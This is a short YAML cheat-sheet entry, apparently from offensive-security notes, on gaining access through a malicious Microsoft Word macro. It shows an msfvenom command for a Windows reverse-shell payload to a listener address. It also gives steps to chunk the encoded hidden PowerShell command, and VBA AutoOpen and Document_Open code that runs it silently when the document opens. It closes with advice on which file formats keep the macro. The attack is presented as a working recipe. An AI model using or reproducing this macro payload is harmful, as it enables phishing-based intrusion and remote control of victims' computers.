---
functions:
  gain-access:
    - description: Embed a Macro into a MS WOrd Document
      code: |
        (1) Generate msfvenom code:
            msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.227 LPORT=9999 -f hta-psh

        (2) python3 splitstr.py 50 (link below)

        (3) Copy and paste “powershell.exe -nop -w hidden -e aQBmACgAWwBJ ...” into the splitstr prompt   - MIND THE QUOTES!

        (4) cp/paste as the Str variable in the MyMacro Sub below


        Sub AutoOpen()
            MyMacro
        End Sub

        Sub Document_Open()
            MyMacro
        End Sub

        Sub MyMacro()
            Dim Str As String
            Str = ""
            Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
            Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
            Str = Str + "kAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnA"
            Str = Str + "H0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGk"
            ...
            ...
            Str = Str + "GkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHM"
            Str = Str + "AdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAb"
            Str = Str + "wBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA"

            Set objShell = CreateObject("WScript.Shell")
            objShell.Run Str, 0, True
            

            End Sub

            NOTE: You must save the containing document as either .docm or the older .doc format, which supports embedded macros, but must avoid the .docx format, which does not support them.

resources : |
  https://github.com/unkn0wnsyst3m/scripts/blob/master/splitstr.py
---

